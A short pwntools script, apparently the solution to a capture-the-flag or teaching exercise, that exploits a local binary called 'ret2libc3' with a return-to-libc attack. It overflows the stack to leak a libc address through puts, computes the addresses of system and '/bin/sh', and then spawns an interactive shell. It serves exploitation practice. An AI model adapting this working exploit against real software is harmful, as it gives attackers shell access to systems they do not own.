from pwn import *

sh = process('./ret2libc3')

elf_ret2libc3 = ELF('./ret2libc3')
elf_libc = ELF('/usr/lib/i386-linux-gnu/libc.so.6')

puts_plt = elf_ret2libc3.plt['puts']
libc_start_main_got = elf_ret2libc3.got['__libc_start_main']
addr_start = elf_ret2libc3.symbols['_start']
offset = 0x6c + 4

payload1 = flat([b'A' * offset, puts_plt, addr_start, libc_start_main_got])
sh.sendlineafter('Can you find it !?', payload1)


libc_start_main_addr = u32(sh.recv()[0:4])
libcbase = libc_start_main_addr - elf_libc.symbols['__libc_start_main']
system_addr = libcbase + elf_libc.symbols['system']
binsh_addr = libcbase + next(elf_libc.search(b'/bin/sh'))

payload2 = flat([b'A' * offset, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload2)

sh.interactive()
